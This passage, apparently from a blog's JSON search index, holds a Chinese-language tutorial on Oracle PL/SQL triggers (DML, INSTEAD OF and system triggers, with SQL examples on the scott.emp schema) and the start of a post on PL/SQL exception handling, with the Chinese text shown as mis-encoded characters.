ä¹Ÿå°±æ˜¯è§¦å‘äº‹ä»¶å’Œè¯¥TRIGGER çš„æ“ä½œé¡ºåº è§¦å‘å™¨æœ¬èº« å³è¯¥TRIGGER è¢«è§¦å‘ä¹‹åçš„ç›®çš„å’Œæ„å›¾ï¼Œæ­£æ˜¯è§¦å‘å™¨æœ¬èº«è¦åšçš„äº‹æƒ… ä¾‹å¦‚ï¼šPL/SQL å—ã€‚ è§¦å‘é¢‘ç‡ è¯´æ˜è§¦å‘å™¨å†…å®šä¹‰çš„åŠ¨ä½œè¢«æ‰§è¡Œçš„æ¬¡æ•° å³è¯­å¥çº§(STATEMENT)è§¦å‘å™¨å’Œè¡Œçº§(ROW)è§¦å‘å™¨ è¯­å¥çº§(STATEMENT)è§¦å‘å™¨ æ˜¯æŒ‡å½“æŸè§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè¯¥è§¦å‘å™¨åªæ‰§è¡Œä¸€æ¬¡ è¡Œçº§(ROW)è§¦å‘å™¨ æ˜¯æŒ‡å½“æŸè§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¯¹å—åˆ°è¯¥æ“ä½œå½±å“çš„æ¯ä¸€è¡Œæ•°æ®ï¼Œè§¦å‘å™¨éƒ½å•ç‹¬æ‰§è¡Œä¸€æ¬¡ åˆ›å»ºè§¦å‘å™¨è¯­æ³•12345678CREATE [OR REPLACE] TRIGGER trigger_name &#123;BEFORE | AFTER &#125; &#123;INSERT | DELETE | UPDATE [OF column [, column â€¦]]&#125; ON [schema.] table_name [REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] [FOR EACH ROW ] [WHEN condition] trigger_body; æ³¨ï¼š BEFORE å’ŒAFTER æŒ‡å‡ºè§¦å‘å™¨çš„è§¦å‘æ—¶åºåˆ†åˆ«ä¸ºå‰è§¦å‘å’Œåè§¦å‘æ–¹å¼ å‰è§¦å‘æ˜¯åœ¨æ‰§è¡Œè§¦å‘äº‹ä»¶ä¹‹å‰è§¦å‘å½“å‰æ‰€åˆ›å»ºçš„è§¦å‘å™¨ åè§¦å‘æ˜¯åœ¨æ‰§è¡Œè§¦å‘äº‹ä»¶ä¹‹åè§¦å‘å½“å‰æ‰€åˆ›å»ºçš„è§¦å‘å™¨ FOR EACH ROW è¯´æ˜è§¦å‘å™¨ä¸ºè¡Œè§¦å‘å™¨ è¡Œè§¦å‘å™¨å’Œè¯­å¥è§¦å‘å™¨çš„åŒºåˆ«è¡¨ç°åœ¨ è¡Œè§¦å‘å™¨è¦æ±‚å½“ä¸€ä¸ªDMLè¯­å¥æ“èµ°å½±å“æ•°æ®åº“ä¸­çš„å¤šè¡Œæ•°æ®æ—¶ï¼Œå¯¹äºå…¶ä¸­çš„æ¯ä¸ªæ•°æ®è¡Œï¼Œåªè¦å®ƒä»¬ç¬¦åˆè§¦å‘çº¦æŸæ¡ä»¶ï¼Œå‡æ¿€æ´»ä¸€æ¬¡è§¦å‘å™¨ è¯­å¥è§¦å‘å™¨å°†æ•´ä¸ªè¯­å¥æ“ä½œä½œä¸ºè§¦å‘äº‹ä»¶ï¼Œå½“å®ƒç¬¦åˆçº¦æŸæ¡ä»¶æ—¶ï¼Œæ¿€æ´»ä¸€æ¬¡è§¦å‘å™¨ å½“çœç•¥FOR EACH ROW é€‰é¡¹æ—¶ BEFORE å’ŒAFTER è§¦å‘å™¨ä¸ºè¯­å¥è§¦å‘å™¨ï¼Œ INSTEAD OF è§¦å‘å™¨åˆ™ä¸ºè¡Œè§¦å‘å™¨ REFERENCING è¯´æ˜ç›¸å…³åç§° åœ¨è¡Œè§¦å‘å™¨çš„PL/SQLå—å’ŒWHEN å­å¥ä¸­å¯ä»¥ä½¿ç”¨ç›¸å…³åç§°å‚ç…§å½“å‰çš„æ–°ã€æ—§åˆ—å€¼ï¼Œé»˜è®¤çš„ç›¸å…³åç§°åˆ†åˆ«ä¸ºOLDå’ŒNEWã€‚ è§¦å‘å™¨çš„PL/SQLå—ä¸­åº”ç”¨ç›¸å…³åç§°æ—¶ï¼Œå¿…é¡»åœ¨å®ƒä»¬ä¹‹å‰åŠ å†’å·(:)ï¼Œä½†åœ¨WHENå­å¥ä¸­åˆ™ä¸èƒ½åŠ å†’å·ã€‚ WHEN è¯´æ˜è§¦å‘çº¦æŸæ¡ä»¶ Condition ä¸ºä¸€ä¸ªé€»è¾‘è¡¨è¾¾æ—¶ï¼Œå…¶ä¸­å¿…é¡»åŒ…å«ç›¸å…³åç§°ï¼Œè€Œä¸èƒ½åŒ…å«æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨PL/SQL å‡½æ•° WHEN å­å¥æŒ‡å®šçš„è§¦å‘çº¦æŸæ¡ä»¶ åªèƒ½ç”¨åœ¨BEFORE å’ŒAFTER è¡Œè§¦å‘å™¨ä¸­ ä¸èƒ½ç”¨åœ¨INSTEAD OF è¡Œè§¦å‘å™¨å’Œå…¶å®ƒç±»å‹çš„è§¦å‘å™¨ä¸­ å½“ä¸€ä¸ªåŸºè¡¨è¢«ä¿®æ”¹( INSERT, UPDATE, DELETE)æ—¶è¦æ‰§è¡Œçš„å­˜å‚¨è¿‡ç¨‹ï¼Œæ‰§è¡Œæ—¶æ ¹æ®å…¶æ‰€ä¾é™„çš„åŸºè¡¨æ”¹åŠ¨è€Œè‡ªåŠ¨è§¦å‘å› æ­¤ä¸åº”ç”¨ç¨‹åºæ— å…³ï¼Œç”¨æ•°æ®åº“è§¦å‘å™¨å¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚ æ¯å¼ è¡¨æœ€å¤šå¯åˆ›å»º12ç§è§¦å‘å™¨123456789101112BEFORE INSERT BEFORE INSERT FOR EACH ROW AFTER INSERT AFTER INSERT FOR EACH ROW BEFORE UPDATE BEFORE UPDATE FOR EACH ROW AFTER UPDATE AFTER UPDATE FOR EACH ROW BEFORE DELETE BEFORE DELETE FOR EACH ROW AFTER DELETE AFTER DELETE FOR EACH ROW è§¦å‘å™¨æ‰§è¡Œé¡ºåº æ‰§è¡Œ BEFOREè¯­å¥çº§è§¦å‘å™¨ å¯¹äºå—è¯­å¥å½±å“çš„æ¯ä¸€è¡Œï¼š æ‰§è¡Œ BEFOREè¡Œçº§è§¦å‘å™¨ æ‰§è¡Œ DMLè¯­å¥ æ‰§è¡Œ AFTERè¡Œçº§è§¦å‘å™¨ æ‰§è¡Œ AFTERè¯­å¥çº§è§¦å‘å™¨ åˆ›å»ºDMLè§¦å‘å™¨ è§¦å‘å™¨åä¸è¿‡ç¨‹åå’ŒåŒ…çš„åå­—ä¸ä¸€æ ·ï¼Œå®ƒæ˜¯å•ç‹¬çš„åå­—ç©ºé—´ï¼Œå› è€Œè§¦å‘å™¨åå¯ä»¥å’Œè¡¨æˆ–è¿‡ç¨‹æœ‰ç›¸åŒçš„åå­— ä½†åœ¨ä¸€ä¸ªæ¨¡å¼ä¸­è§¦å‘å™¨åä¸èƒ½ç›¸åŒ ç¤ºä¾‹12345678--ä¾‹ï¼š å»ºç«‹ä¸€ä¸ªè§¦å‘å™¨, å½“èŒå·¥è¡¨ emp è¡¨è¢«åˆ é™¤ä¸€æ¡è®°å½•æ—¶ï¼ŒæŠŠè¢«åˆ é™¤è®°å½•å†™åˆ°èŒå·¥è¡¨åˆ é™¤æ—¥å¿—è¡¨ä¸­å»ã€‚ CREATE OR REPLACE TRIGGER del_emp BEFORE DELETE ON scott.emp FOR EACH ROW BEGIN --å°†ä¿®æ”¹å‰æ•°æ®æ’å…¥åˆ°æ—¥å¿—è®°å½•è¡¨ del_emp ,ä»¥ä¾›ç›‘ç£ä½¿ç”¨ã€‚ INSERT INTO emp_his(deptno,empno,ename,job,mgr,sal,comm,hiredate)VALUES (:old.deptno,:old.empno,:old.ename,:old.job,:old.mgr,:old.sal, :old.comm,:old.hiredate); END; è§¦å‘å™¨çš„é™åˆ¶ CREATE TRIGGERè¯­å¥æ–‡æœ¬çš„å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡32KB (ç”±äºå¤§å°å—åˆ°é™åˆ¶ä¹Ÿä¸èƒ½ä½¿ç”¨long,blobè¿™æ ·çš„å¤§å˜é‡.å¦‚æœå®åœ¨æ˜¯æœ‰å¤æ‚çš„é€»è¾‘,è¦å¼„ä¸ªå¾ˆå¤æ‚çš„è§¦å‘å™¨,å¯ä»¥é€šè¿‡procedureæˆ–functionå®ç°ä¸€éƒ¨åˆ†åŠŸèƒ½,ç„¶åè°ƒç”¨) è§¦å‘å™¨ä½“å†…çš„SELECT è¯­å¥åªèƒ½ä¸ºSELECT â€¦ INTO â€¦ç»“æ„ï¼Œæˆ–è€…ä¸ºå®šä¹‰æ¸¸æ ‡æ‰€ä½¿ç”¨çš„SELECT è¯­å¥ è§¦å‘å™¨ä¸­ä¸èƒ½ä½¿ç”¨æ•°æ®åº“äº‹åŠ¡æ§åˆ¶è¯­å¥ COMMITï¼Œ ROLLBACK, SVAEPOINT è¯­å¥ ç”±è§¦å‘å™¨æ‰€è°ƒç”¨çš„è¿‡ç¨‹æˆ–å‡½æ•°ä¹Ÿä¸èƒ½ä½¿ç”¨æ•°æ®åº“äº‹åŠ¡æ§åˆ¶è¯­å¥ è§¦å‘å™¨ä¸­ä¸èƒ½ä½¿ç”¨LONG, LONG RAW ç±»å‹ è§¦å‘å™¨å†…å¯ä»¥å‚ç…§LOBç±»å‹åˆ—çš„åˆ—å€¼ï¼Œä½†ä¸èƒ½é€šè¿‡ :NEW ä¿®æ”¹LOBåˆ—ä¸­çš„æ•°æ® (LOBç±»å‹ï¼šå°†ä¿¡æ¯æ–‡ä»¶ï¼ˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶ï¼‰ã€å›¾åƒç”šè‡³éŸ³é¢‘ä¿¡æ¯é‡‡ç”¨æ•°æ®åº“ä½œä¸ºä¿å­˜è½½ä½“æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨lobç±»å‹æ•°æ®ã€‚æ¯ä¸ªLOBå¯ä»¥æœ‰2GBã€‚) (LOBç±»å‹ï¼šå°†ä¿¡æ¯æ–‡ä»¶ï¼ˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶ï¼‰ã€å›¾åƒç”šè‡³éŸ³é¢‘ä¿¡æ¯é‡‡ç”¨æ•°æ®åº“ä½œä¸ºä¿å­˜è½½ä½“æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨lobç±»å‹æ•°æ®ã€‚æ¯ä¸ªLOBå¯ä»¥æœ‰2GBã€‚) è¡Œçº§åˆ«è§¦å‘å™¨ä¸­çš„ç›¸å…³æ ‡è¯†ç¬¦å½“è§¦å‘å™¨è¢«è§¦å‘æ—¶ï¼Œè¦ä½¿ç”¨è¢«æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤çš„è®°å½•ä¸­çš„åˆ—å€¼ï¼Œæœ‰æ—¶è¦ä½¿ç”¨æ“ä½œå‰ã€ååˆ—çš„å€¼ ï¼Œå¯ä»¥ä½¿ç”¨ï¼š :NEW ä¿®é¥°ç¬¦è®¿é—®æ“ä½œå®Œæˆååˆ—çš„å€¼ :OLD ä¿®é¥°ç¬¦è®¿é—®æ“ä½œå®Œæˆå‰åˆ—çš„å€¼ ç‰¹æ€§ INSERT UPDATE DELETE NEW æœ‰æ•ˆ æœ‰æ•ˆ NULL OLD NULL æœ‰æ•ˆ æœ‰æ•ˆ ç¤ºä¾‹12345678CREATE OR REPLACE TRIGGER upd_emp BEFORE update ON scott.emp REFERENCING new AS nn old AS oo FOR EACH ROW WHEN (nn.sal &gt; 2000) BEGIN dbms_output.put_line(:nn.sal||&#39;------&#39;||:oo.sal); END; DMLè§¦å‘å™¨ä¸­çš„è°“è¯åœ¨DMLè§¦å‘å™¨ä¸­ï¼Œä»–ä»¬è¢«ä¸åŒçš„DMLè¯­å¥æ‰€è§¦å‘ï¼Œæœ‰ä¸‰ä¸ªå¸ƒå°”å‹å‡½æ•°æ¥ç¡®å®šæ“ä½œåˆ°åº•æ˜¯ä»€ä¹ˆï¼š è°“è¯ æè¿° INSERTING å¦‚æœè§¦å‘è¯­å¥æ˜¯INSERTï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE UPDATING å¦‚æœè§¦å‘è¯­å¥æ˜¯UPDATEï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE DELETING å¦‚æœè§¦å‘è¯­å¥æ˜¯DELETEï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE 1234567891011121314151617--ä¾‹CREATE OR REPLACE TRIGGER check_emp BEFORE update OR insert OR delete ON scott.emp REFERENCING new AS nn old AS oo FOR EACH ROW WHEN (nn.sal &gt; 2000) BEGIN IF INSERTING THEN dbms_output.put_line(&#39;THE OPERATION IS INSERT&#39;); ELSIF UPDATING THEN dbms_output.put_line(&#39;THE OPERATION IS UPDATE&#39;); ELSIF DELETING THEN dbms_output.put_line(&#39;THE OPERATION IS DELETE&#39;); ELSE dbms_output.put_line(&#39;OTHERS OPERATION&#39;); END IF; END; åˆ›å»ºæ›¿ä»£è§¦å‘å™¨è¯­æ³•1234567CREATE [OR REPLACE] TRIGGER trigger_name INSTEAD OF &#123;INSERT | DELETE | UPDATE [OF column [, column â€¦]]&#125; ON [schema.] view_name [REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] [FOR EACH ROW ] trigger_body; æ³¨ï¼š INSTEAD OF ä½¿ORACLEæ¿€æ´»è§¦å‘å™¨ï¼Œè€Œä¸æ‰§è¡Œè§¦å‘äº‹ä»¶ã€‚ ä¸DMLè§¦å‘å™¨ä¸åŒï¼ŒDMLè§¦å‘å™¨æ˜¯åœ¨DMLæ“ä½œä¹‹å¤–è¿è¡Œçš„ï¼Œè€Œæ›¿ä»£è§¦å‘å™¨åˆ™ä»£æ›¿æ¿€å‘å®ƒçš„DMLè¯­å¥è¿è¡Œã€‚ æ›¿ä»£è§¦å‘å™¨æ˜¯è¡Œä¸€çº§çš„ã€‚åªèƒ½å¯¹è§†å›¾å’Œå¯¹è±¡è§†å›¾å»ºç«‹INSTEAD OFè§¦å‘å™¨ï¼Œè€Œä¸èƒ½å¯¹è¡¨ã€æ¨¡å¼å’Œæ•°æ®åº“å»ºç«‹INSTEAD OF è§¦å‘å™¨ã€‚ è€ŒINSTEAD OF è§¦å‘å™¨åˆ™ä¸ºè¡Œè§¦å‘å™¨ã€‚ REFERENCING è¯´æ˜ç›¸å…³åç§°ï¼Œåœ¨è¡Œè§¦å‘å™¨çš„PL/SQLå—å’ŒWHENå­å¥ä¸­å¯ä»¥ä½¿ç”¨ç›¸å…³åç§°å‚ç…§å½“å‰çš„æ–°ã€æ—§åˆ—å€¼ï¼Œé»˜è®¤çš„ç›¸å…³åç§°åˆ†åˆ«ä¸ºOLDå’ŒNEWã€‚ è§¦å‘å™¨çš„PL/SQLå—ä¸­åº”ç”¨ç›¸å…³åç§°æ—¶ï¼Œå¿…é¡»åœ¨å®ƒä»¬ä¹‹å‰åŠ å†’å·(:)ï¼Œä½†åœ¨WHENå­å¥ä¸­åˆ™ä¸èƒ½åŠ å†’å·ã€‚ WHEN å­å¥è¯´æ˜è§¦å‘çº¦æŸæ¡ä»¶ã€‚ Condition ä¸ºä¸€ä¸ªé€»è¾‘è¡¨è¾¾æ—¶ï¼Œå…¶ä¸­å¿…é¡»åŒ…å«ç›¸å…³åç§°ï¼Œè€Œä¸èƒ½åŒ…å«æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨PL/SQL å‡½æ•°ã€‚ WHEN æŒ‡å®šçš„è§¦å‘çº¦æŸæ¡ä»¶åªèƒ½ç”¨åœ¨BEFORE å’ŒAFTER è¡Œè§¦å‘å™¨ä¸­ï¼Œä¸èƒ½ç”¨åœ¨INSTEAD OF è¡Œè§¦å‘å™¨å’Œå…¶å®ƒç±»å‹çš„è§¦å‘å™¨ä¸­ã€‚ INSTEAD_OF ç”¨äºå¯¹è§†å›¾çš„DMLè§¦å‘ï¼Œç”±äºè§†å›¾æœ‰å¯èƒ½æ˜¯ç”±å¤šä¸ªè¡¨è¿›è¡Œè”ç»“(join)è€Œæˆï¼Œå› è€Œå¹¶éæ˜¯æ‰€æœ‰çš„è”ç»“éƒ½æ˜¯å¯æ›´æ–°çš„ã€‚ä½†å¯ä»¥æŒ‰ç…§æ‰€éœ€çš„æ–¹å¼æ‰§è¡Œæ›´æ–° æ›¿ä»£è§¦å‘å™¨åº”ç”¨ä¸¾ä¾‹æˆ‘ä»¬å¯ä»¥åˆ›å»ºINSTEAD_OFè§¦å‘å™¨æ¥ä¸º DELETE æ“ä½œæ‰§è¡Œæ‰€éœ€çš„å¤„ç†ï¼Œå³åˆ é™¤EMPè¡¨ä¸­æ‰€æœ‰åŸºå‡†è¡Œï¼š 123456CREATE OR REPLACE TRIGGER emp_view_delete INSTEAD OF DELETE ON emp_view FOR EACH ROW BEGIN DELETE FROM emp WHERE deptno&#x3D; :old.deptno; END emp_view_delete; DELETE FROM emp_view WHERE deptno&#x3D;10; åˆ›å»ºç³»ç»Ÿè§¦å‘å™¨ ç³»ç»Ÿè§¦å‘å™¨å¯ä»¥åœ¨DDLæˆ–æ•°æ®åº“ç³»ç»Ÿä¸Šè¢«è§¦å‘ã€‚DDLæŒ‡çš„æ˜¯æ•°æ®å®šä¹‰è¯­è¨€ï¼Œå¦‚CREATE ã€ALTERåŠDROP ç­‰ã€‚ æ•°æ®åº“ç³»ç»Ÿäº‹ä»¶åŒ…æ‹¬æ•°æ®åº“æœåŠ¡å™¨çš„å¯åŠ¨æˆ–å…³é—­ï¼Œç”¨æˆ·çš„ç™»å½•ä¸é€€å‡ºã€æ•°æ®åº“æœåŠ¡é”™è¯¯ç­‰ã€‚ è¯­æ³•123456CREATE OR REPLACE TRIGGER [sachema.] trigger_name &#123;BEFORE|AFTER&#125; &#123;ddl_event_list | database_event_list&#125; ON &#123; DATABASE | [schema.] SCHEMA &#125; [WHEN_clause] trigger_body; æ³¨ï¼š ddl_event_listä¸ºä¸€ä¸ªæˆ–å¤šä¸ªDDLäº‹ä»¶ï¼Œäº‹ä»¶é—´ç”¨ OR åˆ†å¼€ï¼› database_event_listä¸ºä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®åº“äº‹ä»¶ï¼Œäº‹ä»¶é—´ç”¨ OR åˆ†å¼€ï¼› ç³»ç»Ÿäº‹ä»¶è§¦å‘å™¨æ—¢å¯ä»¥å»ºç«‹åœ¨ä¸€ä¸ªæ¨¡å¼ä¸Šï¼Œåˆå¯ä»¥å»ºç«‹åœ¨æ•´ä¸ªæ•°æ®åº“ä¸Šã€‚ å½“å»ºç«‹åœ¨æ¨¡å¼(SCHEMA)ä¹‹ä¸Šæ—¶ï¼Œåªæœ‰æ¨¡å¼æ‰€æŒ‡å®šç”¨æˆ·çš„DDLæ“ä½œå’Œå®ƒä»¬æ‰€å¯¼è‡´çš„é”™è¯¯æ‰æ¿€æ´»è§¦å‘å™¨, é»˜è®¤æ—¶ä¸ºå½“å‰ç”¨æˆ·æ¨¡å¼ã€‚ å½“å»ºç«‹åœ¨æ•°æ®åº“(DATABASE)ä¹‹ä¸Šæ—¶ï¼Œè¯¥æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·çš„DDLæ“ä½œå’Œä»–ä»¬æ‰€å¯¼è‡´çš„é”™è¯¯ï¼Œä»¥åŠæ•°æ®åº“çš„å¯åŠ¨å’Œå…³é—­å‡å¯æ¿€æ´»è§¦å‘å™¨ã€‚ è¦åœ¨æ•°æ®åº“ä¹‹ä¸Šå»ºç«‹è§¦å‘å™¨æ—¶ï¼Œè¦æ±‚ç”¨æˆ·å…·æœ‰ADMINISTER DATABASE TRIGGERæƒé™ã€‚ ç³»ç»Ÿè§¦å‘å™¨çš„ç§ç±»å’Œäº‹ä»¶å‡ºç°çš„æ—¶æœºï¼ˆå‰æˆ–åï¼‰ï¼š äº‹ä»¶ å…è®¸çš„æ—¶æœº è¯´æ˜ å¯åŠ¨STARTUP ä¹‹å å®ä¾‹å¯åŠ¨æ—¶æ¿€æ´» å…³é—­SHUTDOWN ä¹‹å‰ å®ä¾‹æ­£å¸¸å…³é—­æ—¶æ¿€æ´» æœåŠ¡å™¨é”™è¯¯SERVERERROR ä¹‹å åªè¦æœ‰é”™è¯¯å°±æ¿€æ´» ç™»å½•LOGON ä¹‹å æˆåŠŸç™»å½•åæ¿€æ´» æ³¨é”€LOGOFF ä¹‹å‰ å¼€å§‹æ³¨é”€æ—¶æ¿€æ´» åˆ›å»ºCREATE ä¹‹å‰ï¼Œä¹‹å åœ¨åˆ›å»ºä¹‹å‰æˆ–ä¹‹åæ¿€æ´» æ’¤æ¶ˆDROP ä¹‹å‰ï¼Œä¹‹å åœ¨æ’¤æ¶ˆä¹‹å‰æˆ–ä¹‹åæ¿€æ´» å˜æ›´ALTER ä¹‹å‰ï¼Œä¹‹å åœ¨å˜æ›´ä¹‹å‰æˆ–ä¹‹åæ¿€æ´» ç¤ºä¾‹123456789101112131415CREATE OR REPLACE TRIGGER trig4_ddl AFTER CREATE OR ALTER OR DROP ON DATABASE DECLARE Event VARCHAR2(20); Typ VARCHAR2(20); Name VARCHAR2(30); Owner VARCHAR2(30); BEGIN --è¯»å–DDLäº‹ä»¶å±æ€§ Event :&#x3D; SYSEVENT; --æ¿€æ´»è§¦å‘å™¨çš„äº‹ä»¶åç§° Typ :&#x3D; DICTIONARY_OBJ_TYPE; --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡ç±»å‹ Name :&#x3D; DICTIONARY_OBJ_NAME; --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡åç§° Owner :&#x3D; DICTIONARY_OBJ_OWNER; --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡æ‰€æœ‰è€…åç§° -- å°†äº‹ä»¶å±æ€§æ’å…¥åˆ°äº‹ä»¶æ—¥å¿—è¡¨ä¸­ INSERT INTO scott.eventlog(eventname,obj_type,obj_name,obj_owner) VALUES(event, typ, name, owner); END; é‡æ–°ç¼–è¯‘è§¦å‘å™¨ å¦‚æœåœ¨è§¦å‘å™¨å†…è°ƒç”¨å…¶å®ƒå‡½æ•°æˆ–è¿‡ç¨‹ï¼Œå½“è¿™äº›å‡½æ•°æˆ–è¿‡ç¨‹è¢«åˆ é™¤æˆ–ä¿®æ”¹åï¼Œè§¦å‘å™¨çš„çŠ¶æ€å°†è¢«æ ‡è¯†ä¸ºæ— æ•ˆã€‚å½“DMLè¯­å¥æ¿€æ´»ä¸€ä¸ªæ— æ•ˆè§¦å‘å™¨æ—¶ï¼ŒORACLEå°†é‡æ–°ç¼–è¯‘è§¦å‘å™¨ä»£ç ï¼Œå¦‚æœç¼–è¯‘æ—¶å‘ç°é”™è¯¯ï¼Œè¿™å°†å¯¼è‡´DMLè¯­å¥æ‰§è¡Œå¤±è´¥ã€‚ åœ¨PL/SQLç¨‹åºä¸­å¯ä»¥è°ƒç”¨ALTER TRIGGERè¯­å¥é‡æ–°ç¼–è¯‘å·²ç»åˆ›å»ºçš„è§¦å‘å™¨ï¼Œæ ¼å¼ä¸ºï¼š 1ALTER TRIGGER [schema.] trigger_name COMPILE åˆ é™¤è§¦å‘å™¨ è¯­æ³•1DROP TRIGGER trigger_name; æ³¨ï¼š å½“åˆ é™¤å…¶ä»–ç”¨æˆ·æ¨¡å¼ä¸­çš„è§¦å‘å™¨åç§°ï¼Œéœ€è¦å…·æœ‰DROP ANY TRIGGERç³»ç»Ÿæƒé™ å½“åˆ é™¤å»ºç«‹åœ¨æ•°æ®åº“ä¸Šçš„è§¦å‘å™¨æ—¶ï¼Œç”¨æˆ·éœ€è¦å…·æœ‰ADMINISTER DATABASE TRIGGERç³»ç»Ÿæƒé™ å½“åˆ é™¤è¡¨æˆ–è§†å›¾æ—¶ï¼Œå»ºç«‹åœ¨è¿™äº›å¯¹è±¡ä¸Šçš„è§¦å‘å™¨ä¹Ÿéšä¹‹åˆ é™¤ è§¦å‘å™¨çŠ¶æ€æœ‰æ•ˆçŠ¶æ€(ENABLE) å½“è§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¤„äºæœ‰æ•ˆçŠ¶æ€çš„æ•°æ®åº“è§¦å‘å™¨TRIGGER å°†è¢«è§¦å‘ã€‚ æ— æ•ˆçŠ¶æ€(DISABLE) å½“è§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¤„äºæ— æ•ˆçŠ¶æ€çš„æ•°æ®åº“è§¦å‘å™¨TRIGGER å°†ä¸ä¼šè¢«è§¦å‘ï¼Œæ­¤æ—¶å°±è·Ÿæ²¡æœ‰è¿™ä¸ªæ•°æ®åº“è§¦å‘å™¨(TRIGGER) ä¸€æ ·ã€‚ æ•°æ®åº“TRIGGERçš„è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥äº’ç›¸è½¬æ¢ ALTER TRIGGERè¯­å¥ä¸€æ¬¡åªèƒ½æ”¹å˜ä¸€ä¸ªè§¦å‘å™¨çš„çŠ¶æ€ ALTER TABLEè¯­å¥åˆ™ä¸€æ¬¡èƒ½å¤Ÿæ”¹å˜ä¸æŒ‡å®šè¡¨ç›¸å…³çš„æ‰€æœ‰è§¦å‘å™¨çš„ä½¿ç”¨çŠ¶æ€ã€‚ ALTER TIGGER1234ALTER TIGGER trigger_name [DISABLE | ENABLE ]; --ä¾‹ï¼šALTER TRIGGER emp_view_delete DISABLE; ALTER TABLE1234ALTER TABLE [schema.]table_name &#123;ENABLE|DISABLE&#125; ALL TRIGGERS; --ä¾‹ï¼šä½¿è¡¨EMP ä¸Šçš„æ‰€æœ‰TRIGGER å¤±æ•ˆï¼š ALTER TABLE emp DISABLE ALL TRIGGERS; è§¦å‘å™¨å’Œæ•°æ®å­—å…¸ç›¸å…³æ•°æ®å­—å…¸ï¼š USER_TRIGGERS ALL_TRIGGERS DBA_TRIGGERS 1234--ä¾‹ï¼šSELECT TRIGGER_NAME, TRIGGER_TYPE, TRIGGERING_EVENT, TABLE_OWNER, BASE_OBJECT_TYPE, REFERENCING_NAMES, STATUS, ACTION_TYPE FROM user_triggers;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsqlå¼‚å¸¸å¤„ç†","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlé”™è¯¯å¤„ç†/","text":"plsqlå¼‚å¸¸å¤„ç†å¼‚å¸¸å¤„ç†çš„æ¦‚å¿µå¼‚å¸¸æƒ…å†µå¤„ç†(EXCEPTION)æ˜¯ç”¨æ¥å¤„ç†æ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ä¸­æœªé¢„æ–™çš„äº‹ä»¶,ç¨‹åºå—çš„å¼‚å¸¸å¤„ç†é¢„å®šä¹‰çš„é”™è¯¯å’Œè‡ªå®šä¹‰é”™è¯¯,ç”±äºPL/SQLç¨‹åºå—ä¸€æ—¦äº§ç”Ÿå¼‚å¸¸è€Œæ²¡æœ‰æŒ‡å‡ºå¦‚ä½•å¤„ç†æ—¶,ç¨‹åºå°±ä¼šè‡ªåŠ¨ç»ˆæ­¢æ•´ä¸ªç¨‹åºè¿è¡Œã€‚ æœ‰ä¸‰ç§ç±»å‹çš„å¼‚å¸¸é”™è¯¯ : ç±»å‹ æè¿° é¢„å®šä¹‰ ( Predefined )é”™è¯¯ ORACLEé¢„å®šä¹‰çš„å¼‚å¸¸æƒ…å†µå¤§çº¦æœ‰22ä¸ªã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œæ— éœ€åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç”±ORACLEè‡ªåŠ¨å°†å…¶å¼•å‘ éé¢„å®šä¹‰ ( Predefined )é”™è¯¯ å³å…¶ä»–æ ‡å‡†çš„ORACLEé”™è¯¯ã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œéœ€è¦ç”¨æˆ·åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç„¶åç”±ORACLEè‡ªåŠ¨å°†å…¶å¼•å‘ ç”¨æˆ·å®šä¹‰(User_define) é”™è¯¯ ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå‡ºç°ç¼–ç¨‹äººå‘˜è®¤ä¸ºçš„éæ­£å¸¸æƒ…å†µã€‚å¯¹è¿™ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œéœ€è¦ç”¨æˆ·åœ¨ç¨‹åºä¸­å®šä¹‰ï¼Œç„¶åæ˜¾å¼åœ°åœ¨ç¨‹åºä¸­å°†å…¶å¼•å‘ã€‚ å¼‚å¸¸å¤„ç†ç»“æ„:12345EXCEPTION WHEN first_exception THEN &lt;code to handle first exception &gt; WHEN second_exception THEN &lt;code to handle second exception &gt; WHEN OTHERS THEN &lt;code to handle others exception &gt; END; ä½œç”¨èŒƒå›´ PL/SQLçš„å¼‚å¸¸æ•è·åªé’ˆå¯¹æ‰§è¡Œéƒ¨åˆ†ï¼Œåœ¨å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸æ˜¯æ— æ³•æ•è·çš„ å¼‚å¸¸å¤„ç†éƒ¨åˆ†æœ¬èº«å¯¼è‡´çš„å¼‚å¸¸åŒæ ·ä¹Ÿæ˜¯æ— 